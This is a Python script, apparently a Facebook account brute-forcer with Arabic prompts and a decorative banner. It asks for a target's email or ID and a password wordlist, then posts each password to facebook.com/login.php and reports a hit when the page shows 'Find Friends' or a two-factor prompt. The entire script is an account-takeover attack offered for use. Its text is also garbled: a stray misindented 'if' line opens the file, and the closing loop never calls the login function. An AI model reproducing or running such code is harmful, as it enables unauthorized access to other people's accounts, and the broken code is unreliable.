  if function(email, passw, i):
import requests;import urllib.request;import os;from bs4 import *;import sys;from colorama import *;from rich.panel import Panel as heroes;from pyfiglet import *;from rainbowtext import *;from rich import print as code
print('\x1b[38;5;26m');heros = Figlet(font="whimsy").renderText("heros");print('\x1b[38;5;26m');code(heroes('                                 [i][bold purple] heros [/bold purple][/i]      '));print('\x1b[38;5;26m');code(heroes('[bold red]'+heros+'[bold red]'));print('\x1b[38;5;26m');print((text(heros)));print('\x1b[38;5;26m')
if sys.version_info[0] != 3:
    print(
        """heroes"""
)
    sys.exit()
post_url = "https://www.facebook.com/login.php"
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",}
payload = {}
cookie = {}
def create_form():
    form = dict()
    cookie = {"fr": "0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy"}
    data = requests.get(post_url, headers=headers)
    for i in data.cookies:
        cookie[i.name] = i.value
    data = BeautifulSoup(data.text, "html.parser").form
    if data.input["name"] == "lsd":
        form["lsd"] = data.input["value"]
    return (form, cookie)
def function(email, passw, i):
    global payload, cookie
    if i % 10 == 1:
        payload, cookie = create_form()
        payload["email"] = email
    payload["pass"] = passw
    r = requests.post(post_url, data=payload, cookies=cookie, headers=headers)
    if "Find Friends" in r.text or "Two-factor authentication required" in r.text:
        open("temp", "w").write(str(r.content))
        print("\npassword is : ", passw)
        return True
    return False
file1 = os.path.join(os.path.dirname(__file__));print('اكتب اسم ملف الي بيها باسوردات');file1= input("inter name fime pass : ");file  = open(file1, "r");print('\n');print('اكتب يوزر نيم او ايدي او ايميل مال شخص للتخمين علئ حساب');email = input("Enter Email/Username/id : ");i = 0
while file:
    passw = file.readline().strip()
    i += 1
    if len(passw) < 6:
        continue
    print(str(i) + " : ", passw)
        break
